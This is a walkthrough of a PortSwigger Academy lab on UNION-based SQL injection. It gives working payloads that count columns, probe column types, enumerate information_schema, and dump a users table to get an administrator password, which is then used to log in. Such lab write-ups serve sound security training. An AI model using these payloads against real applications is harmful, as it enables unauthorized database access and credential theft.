## [Lab: SQL injection attack, listing the database contents on non-Oracle databases](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle)

### Steps

1. **Access the Lab**  
   - Navigate to the lab and click the "Accessories" category. This sends a request:  
     `GET /filter?category=Accessories`.

2. **Set Up Burp Suite**  
   - Open Burp Suite Community Edition and configure it to intercept browser requests.  
   - Capture the `GET /filter?category=Accessories` request for manipulation.

3. **Determine Number of Columns**  
   - Test the number of columns using `ORDER BY`:  
     - `category=Accessories' ORDER BY 1--`: 200 OK.  
     - `category=Accessories' ORDER BY 2--`: 200 OK.  
     - `category=Accessories' ORDER BY 3--`: 500 Error.  
   - **Result**: The query has 2 columns.

4. **Determine Column Data Types**  
   - Use `UNION SELECT` to test which columns accept string or NULL values:  
     - `category=Accessories' UNION SELECT 'a','a'--`: 200 OK.  
     - `category=Accessories' UNION SELECT 'a',NULL--`: 200 OK.  
     - `category=Accessories' UNION SELECT NULL,'a'--`: 200 OK.  
     - `category=Accessories' UNION SELECT NULL,NULL--`: 200 OK.  
   - **Result**: Both columns accept string or NULL values.

5. **List All Table Names**  
   - Query the `information_schema.tables` to retrieve table names:  
     - `category=Accessories' UNION SELECT table_name, NULL FROM information_schema.tables--`.  
   - **Result**: Identifies the table `users_diivsh`.

6. **List Column Names for the Table**  
   - Query `information_schema.columns` for columns in `users_diivsh`:  
     - `category=Accessories' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users_diivsh'--`.  
   - **Result**: Finds columns `username_bgrkmu` and `password_ynsimc`.

7. **Retrieve Username and Password**  
   - Extract data from the `users_diivsh` table:  
     - `category=Accessories' UNION SELECT username_bgrkmu, password_ynsimc FROM users_diivsh--`.  
   - **Result**: Returns credentials:  
     - Username: `administrator`  
     - Password: `vy7vsqslonb4adqfd8x1`

8. **Login and Solve the Lab**  
   - Use the credentials (`administrator` / `vy7vsqslonb4adqfd8x1`) to log in via the lab’s login page.  
   - Upon successful login, the lab displays a "Congratulations" message.
